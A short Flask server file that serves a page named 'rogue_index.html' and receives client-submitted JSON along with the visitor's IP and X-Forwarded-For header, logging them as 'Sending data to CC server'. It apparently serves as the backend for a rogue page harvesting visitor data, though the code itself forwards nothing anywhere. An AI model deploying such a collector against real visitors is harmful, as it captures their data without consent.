# flask_server.py
from flask import Flask, request, jsonify, render_template
import logging

app = Flask(__name__)

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Route to serve the HTML file
@app.route('/')
def index():
    return render_template('rogue_index.html')

# Route to receive data from client
@app.route('/receive-data', methods=['POST'])
def receive_data():
    data = request.json  # Receive JSON data sent from the client

    # Get the X-Forwarded-For IP address
    x_forwarded_for = request.headers.get('X-Forwarded-For', None)
    # Get the original IP address
    original_ip = request.remote_addr

    print(f"Data received from client: {data}")  # Print the data for debugging purposes
    print(f"X-Forwarded-For IP: {x_forwarded_for}")  # Print the X-Forwarded-For IP
    print(f"Original IP: {original_ip}")  # Print the original IP

    # Prepare a detailed response to send back to the client
    response_data = {
        "status": "success",
        "message": "Data received successfully",
        "details": data,  # Include the received data in the response
        "x_forwarded_for_ip": x_forwarded_for,  # Add the X-Forwarded-For IP to the response
        "original_ip": original_ip  # Add the original IP to the response
    }

    logger.info(f"Sending data to CC server: {response_data}")
    return jsonify(response_data)

if __name__ == '__main__':
    app.run(debug=True)
